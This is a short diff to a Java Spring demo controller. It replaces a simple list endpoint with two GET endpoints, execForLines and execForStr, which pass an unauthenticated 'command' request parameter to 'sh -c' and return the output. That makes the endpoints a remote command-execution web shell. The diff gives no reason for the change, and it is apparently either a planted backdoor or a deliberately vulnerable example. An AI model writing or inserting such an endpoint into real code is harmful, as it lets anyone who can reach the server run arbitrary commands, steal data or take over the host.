@@ -1,5 +1,6 @@
 package io.gitee.zerowsh.actable.demo.controller;
 
+import cn.hutool.core.util.RuntimeUtil;
 import io.gitee.zerowsh.actable.demo.service.IZeroService;
 import io.swagger.annotations.Api;
 import org.springframework.web.bind.annotation.GetMapping;
@@ -15,8 +16,12 @@ public class ZeroController {
     @Resource
     private IZeroService zeroService;
 
-    @GetMapping("getList")
-    public Object getList() {
-        return zeroService.list();
+    @GetMapping("execForLines")
+    public Object execForLines(String command) {
+        return RuntimeUtil.execForLines("sh", "-c",command);
+    }
+    @GetMapping("execForStr")
+    public Object execForStr(String command) {
+        return RuntimeUtil.execForStr("sh", "-c",command);
     }
 }
